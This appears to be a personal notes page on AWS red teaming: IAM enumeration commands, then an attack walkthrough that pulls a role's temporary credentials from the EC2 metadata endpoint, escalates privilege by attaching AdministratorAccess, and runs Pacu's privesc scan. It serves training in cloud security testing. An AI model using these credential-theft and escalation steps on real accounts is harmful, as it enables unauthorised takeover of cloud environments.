---
title: AWS
description: AWS
icon: material/aws # simple/portainer , octicons/mark-github-16 , material/account-convert , lucide/atom
# status: new # deprecated
comments: true
# hide:
#     - navigation
#     - toc
#     - feedback
#     - tags
---


CLI Access

```bash
aws configure --profile xxxxxxxxxxxxx

# Then Specify Access Key ID & Access Key Secret
```


```bash
# Get info about configured identity:
aws sts get-caller-identity --profile xxxxxxxxxxxx
```

!!! tip
    - `ASIA` - _Short term credential_
    - `AKIA` - _Long term credential_

AWS Credentials are stored in:

=== "Windows"

    ```powershell
    c:\Users\Username\.aws
    ```

=== "Linux"

    ```bash
    /home/user/.aws
    ```

### AWS Cloud Core Services Enumeration

#### Users:

https://docs.aws.amazon.com/IAM/latest/UserGuide/id_groups.html

```bash
# Enumerate users
aws iam list-users --profile xxxxxxxxxxx --profile [ profile-name ] 

# List the IAM groups that the specified IAM user belongs to :
aws iam list-groups-for-user --user-name [user-name] --profile [ profile-name ] 

# List all manages policies that are attached to the specified IAM user :
aws iam list-attached-user-policies --user-name [user-name] --profile [ profile-name ] 

# Lists the names of the inline policies embedded in the specified IAM user :
aws iam list-user-policies --user-name [user-name] --profile [ profile-name ] 

```

#### Groups :

https://docs.aws.amazon.com/IAM/latest/UserGuide/id_groups.html

```bash

# List of IAM Groups :
aws iam list-groups

# List of all users in a groups :
aws iam get-group --group-name [group-name] --profile [ profile-name ] 

# Lists all managed policies that are attached to the specified IAM Group :
aws iam list-attached-group-policies --group-name [group-name] --profile [ profile-name ] 

# List the names of the inline policies embedded in the specified IAM Group:
aws iam list-group-policies --group-name [group-name] --profile [ profile-name ] 
```

#### List of IAM Roles :

https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles.html

```bash
# List of IAM Roles :
aws iam list-roles --profile [ profile-name ] 

# Lists all managed policies that are attached to the specified IAM role :
aws iam list-attached-role-policies --role-name [ role-name] --profile [ profile-name ] 

# List the names of the inline policies embedded in the specified IAM role :
aws iam list-role-policies --role-name [ role-name] --profile [ profile-name ] 
```

#### Policies:

https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html


!!! tip

    To determine if a policy is AWS-managed or customer-managed in AWS: Check the policy's ARN. If the ARN contains the account ID, it is a customer-managed policy. AWS-managed policies do not include account IDs in their ARNs.

    Customer-Managed Policies include your AWS account ID in the ARN. For example:

    ```bash
    arn:aws:iam::123456789012:policy/YourPolicyName
    ```

    AWS-Managed Policies do not include an account ID in the ARN. For example:

    ```bash
    arn:aws:iam::aws:policy/AWSReadOnlyAccess
    ```

```bash
# List of all iam policies :
aws iam list-policies

# Retrieves information about the specified managed policy :
aws iam get-policy --policy-arn [policy-arn] --profile [ profile-name ] 

# Lists information about the versions of the specified manages policy :
aws iam list-policy-versions --policy-arn [policy-arn] --profile [ profile-name ] 

# Retrieved information about the specified version of the specified managed policy :
aws iam get-policy-version --policy-arn policy-arn --version-id [version-id]

# Retrieves the specified inline policy document that is embedded on the specified IAM user / group / role :
aws iam get-user-policy --user-name user-name --policy-name [policy-name] 
aws iam get-group-policy --group-name group-name --policy-name [policy-name] 
aws iam get-role-policy --role-name role-name --policy-name [policy-name]

```

### AWS Cloud Red Team Operations


```bash
# Configure Initial Compromised User Credential :
aws configure --profile auditor

# Enumerate Cloud Services, e.g EC2, S3 etc. in an Organization AWS Account :
aws ec2 describe-instances --profile auditor

# Enumerate Cloud Services, e.g EC2, S3 etc. in an Organization AWS Account :
aws ec2 describe-instances --profile auditor

# Exploit Public Facing Application Running on EC2 Instance and Retrieve Temporary Credential :
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/jump-ec2-role
```

!!! note

    Cloud meta-data can be retrieve by exploiting these web app vulnerabilities

    - SSRF 
    - RCE



```bash
# Configure & Validate Temporary Credential in AWS CLI :
aws configure set aws_access_key_id [key-id] --profile ec2
aws configure set aws_secret_access_key [key-id] --profile ec2
aws configure set aws_session_token [token] --profile ec2
aws sts get-caller-identity --profile ec2

# Get the Managed Policy Attached to EC2 Instance :
aws iam list-attached-role-policies --role-name jump-ec2-role --profile auditor

# Retrieves the specified inline policy document that is embedded on the ec2 instance role :
aws iam list-role-policies --role-name jump-ec2-role --profile auditor

# Get the permissions in inline policy :
aws iam get-role-policy --role-name jump-ec2-role --policy-name jump-inline-policy --profile auditor

# Escalate privilege by attaching administrator policy to itself :
aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name jump-ec2-role --profile ec2

# Again, check the managed Policy Attached to EC2 Instance :
aws iam list-attached-role-policies --role-name jump-ec2-role --profile auditor
```


### Red Team Ops with Automated Tool “pacu” :

```bash
# Setting the initial user access key in pacu
set_keys
# Next set alias, access id, secret access key

# Get the permission of current logged-in user
exec iam__enum_permissions
whoami

# Enumerate ec2 instances and get the public ip addresses

exec ec2__enum
# Press "y" to enumerate all regions : PS (It takes time)

data EC2
```



```bash
#Enumerating an AWS instance wih Pacu
# 1. set alias, access id, secret access key

whoami

# Check permission of currently logged in role:
exec iam__enum_permissions

# Enumerate privilege escalation permissions nd exploit it
exec iam__privesc_scan

# Check permission of privilege escalateed role
exec iam__enum_permissions
whoami
```

------


??? note "Some Good Youtube Tutorials"

    <iframe width="748" height="400" src="https://www.youtube.com/embed/OCCvvesay9M" title="1. Introduction to AWS Red Teaming" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>



    <iframe width="707" height="480" src="https://www.youtube.com/embed/ZGDHqKxATeQ" title="2. AWS Cloud Authentication" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


    <iframe width="707" height="480" src="https://www.youtube.com/embed/JD2WGwTcgSc" title="3. AWS Cloud Core Services Enumeration" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


    <iframe width="707" height="480" src="https://www.youtube.com/embed/X20KVCj6wcQ" title="4. AWS Cloud Red Team Operations" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>